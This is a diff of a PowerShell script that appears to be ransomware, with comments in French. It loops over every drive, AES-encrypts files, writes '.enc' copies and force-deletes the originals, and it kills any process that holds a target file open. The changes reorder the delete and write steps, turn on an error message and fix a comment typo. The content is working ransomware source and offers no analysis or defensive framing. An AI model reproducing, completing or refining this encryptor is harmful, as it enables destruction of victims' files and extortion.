@@ -65,19 +65,19 @@ function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
     $erroractionPreference = "stop"
     try{
         $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
-        Set-Content -Path $file'.enc' -Value $encryptedcontent
         Remove-Item –path $file -force
+        Set-Content -Path $file'.enc' -Value $encryptedcontent
     }
     catch{
         try{
             $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
+            Remove-Item –path $file -force
             Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
             Set-Content -Path $file'.enc' -Value $encryptedcontent
-            Remove-Item –path $file -force
             }
             catch{
                 #Write-Host $_.ScriptStackTrace
-                #Write-Host $_
+                Write-Host $_
             }
     }
 }
@@ -199,7 +199,7 @@ function main{
     #Initialisation de l'AES
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
-    #Si plusieurs disque, faire un thread par disque 
+    #Si plusieurs disques, faire un thread par disque 
     foreach ($drive in $drives){
         Encrypt-All $key $drive $aesManaged $encryptor
     }
